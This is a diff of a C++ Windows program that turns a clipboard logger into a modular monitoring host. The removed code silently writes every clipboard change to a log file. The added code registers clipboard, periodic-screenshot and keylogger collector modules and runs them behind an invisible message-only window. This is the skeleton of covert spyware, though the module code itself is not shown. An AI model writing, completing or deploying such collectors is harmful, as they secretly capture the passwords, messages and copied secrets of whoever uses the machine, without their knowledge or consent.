@@ -1,173 +1,84 @@
-// Source - https://stackoverflow.com/a/59473501
-// Posted by Remy Lebeau
-// Retrieved 2026-06-05, License - CC BY-SA 4.0
-#include <Windows.h>
-#include <string_view>
-#include <fstream>
+﻿#include <Windows.h>
 #include <iostream>
+#include "SandboxLoader/Modules/ModuleRegistry.h"
 
-HINSTANCE g_hThisInst = NULL;
-HWND g_hwndCurrent = NULL;
-//HWND g_hwndNext = NULL;
-bool g_AddedListener = false;   
-bool g_UpdatingClipboard = false;
-
-constexpr std::wstring_view CLIP_TEXT = L"AW";
+#include "SandboxLoader/CollectorModules/ClipboardModule.h"
+#include "SandboxLoader/CollectorModules/ScreenshotModule.h"
+#include "SandboxLoader/CollectorModules/KeyloggerModule.h"
 
 
-void take_screenshot()
-{
 
-}
-
-
-void write_clipboard()
-{
-    const auto clipboard_handle = GetClipboardData(CF_UNICODETEXT);
-    if (!clipboard_handle)
-    {
-        throw std::exception("LOL");
-    }
-
-    // Lock the handle to get a pointer
-    wchar_t* text = static_cast<wchar_t*>(GlobalLock(clipboard_handle));
-    if (text == nullptr) {
-        throw std::exception("LOL1");
-    }
-
-    std::wofstream file{ LR"(C:\tmp\clip.log)" , std::ios_base::app };
-    file << text << L"\n";
-
-    GlobalUnlock(clipboard_handle);
-}
-
-
-//void change{
-//
-//    EmptyClipboard();
-//    size_t bytes = (CLIP_TEXT.size() + 1) * sizeof(wchar_t);
-//    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, bytes);
-//    if (!hMem) {
-//        CloseClipboard();
-//        return false;
-//    }
-//    void* ptr = GlobalLock(hMem);
-//    std::memcpy(ptr, CLIP_TEXT.data(), bytes);
-//
-//    GlobalUnlock(hMem);
-//    if (!SetClipboardData(CF_UNICODETEXT, hMem))
-//    {
-//        GlobalFree(hMem);
-//        CloseClipboard();
-//        return false;
-//    }
-//}
-
-uint32_t set_me() {
-    if (!OpenClipboard(nullptr)) return false;
-    try
-    {
-        write_clipboard();
-    }
-    catch (const std::exception&)
-    {
-        std::cerr << "Error" << "\n";
-    } 
-    
-    CloseClipboard();
-    return true;
-}
-
+static HINSTANCE       g_hInst = nullptr;
+static HWND            g_hwnd = nullptr;
+static ModuleRegistry  g_registry;          
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
     switch (uMsg)
     {
     case WM_CREATE:
-        //g_hwndNext = ::SetClipboardViewer(hwnd);
-        g_AddedListener = ::AddClipboardFormatListener(hwnd);
-        return g_AddedListener ? 0 : -1;
+        g_registry.OnCreate(hwnd);
+        return 0;
 
     case WM_DESTROY:
-        /*
-        ChangeClipboardChain(hwnd, g_hwndNext); 
-        g_hwndNext = NULL;
-        */
-        if (g_AddedListener)
-        {
-            RemoveClipboardFormatListener(hwnd);
-            g_AddedListener = false;
-        }
+        g_registry.OnDestroy(hwnd);
+        ::PostQuitMessage(0);
         return 0;
 
-
-    case WM_CLIPBOARDUPDATE:
-        if (g_UpdatingClipboard)
-        {
-            return 0;
-        }
-        g_UpdatingClipboard = true;
-        set_me();
-        g_UpdatingClipboard = false;
-        return 0;
-
-    case WM_DESTROYCLIPBOARD:
-        // Handle clipboard cleared event and forward message
-        break;
+    default:
+        if (g_registry.Dispatch(hwnd, uMsg, wParam, lParam))
+            return 0;                     
+        return ::DefWindowProcW(hwnd, uMsg, wParam, lParam);
     }
-
-    return ::DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
 
-
-HRESULT SetOrRefreshWindowsHook()
+static HRESULT CreateMessageWindow()
 {
-    try
+    WNDCLASSW wc = {};
+    wc.lpfnWndProc = WndProc;
+    wc.hInstance = g_hInst;
+    wc.lpszClassName = L"MonitorHost";
+
+    if (!::RegisterClassW(&wc))
     {
-        if (!g_hwndCurrent)
-        {
-            WNDCLASS wndClass = {};
-            wndClass.lpfnWndProc = &WndProc;
-            wndClass.hInstance = g_hThisInst;
-            wndClass.lpszClassName = TEXT("Nice");
-
-            if (!::RegisterClass(&wndClass))
-            {
-                DWORD dwLastError = ::GetLastError();
-                if (dwLastError != ERROR_CLASS_ALREADY_EXISTS)
-                    return HRESULT_FROM_WIN32(dwLastError);
-            }
-
-            g_hwndCurrent = ::CreateWindowEx(0, wndClass.lpszClassName, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, g_hThisInst, NULL);
-            if (!g_hwndCurrent)
-            {
-                DWORD dwLastError = ::GetLastError();
-                return HRESULT_FROM_WIN32(dwLastError);
-            }
-        }
+        DWORD err = ::GetLastError();
+        if (err != ERROR_CLASS_ALREADY_EXISTS)
+            return HRESULT_FROM_WIN32(err);
     }
-    catch (...)
-    {
-        return E_UNEXPECTED;
-    }
+    
+    g_hwnd = ::CreateWindowExW(
+        0, L"MonitorHost", L"", 0,
+        0, 0, 0, 0,
+        HWND_MESSAGE, nullptr, g_hInst, nullptr);
 
-    return S_OK;
+    return g_hwnd ? S_OK : HRESULT_FROM_WIN32(::GetLastError());
 }
 
-
-
-int WINAPI main(
-    HINSTANCE hInstance,
-    HINSTANCE,
-    PWSTR,
-    int)
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 {
-    g_hThisInst = hInstance;
-    SetOrRefreshWindowsHook();
+    g_hInst = hInstance;
+
+
+    g_registry.Register(std::make_unique<ClipboardModule>());
+
+
+    g_registry.Register(std::make_unique<ScreenshotModule>(30));
+
+    g_registry.Register(std::make_unique<KeyloggerModule>());
+
+    if (FAILED(CreateMessageWindow()))
+    {
+        std::cerr << "[main] Failed to create message window\n";
+        return 1;
+    }
+
+   
     MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0))
+    while (::GetMessage(&msg, nullptr, 0, 0) > 0)
     {
-        DispatchMessage(&msg);
+        ::TranslateMessage(&msg); 
+        ::DispatchMessage(&msg);
     }
-}
 
+    return static_cast<int>(msg.wParam);
+}
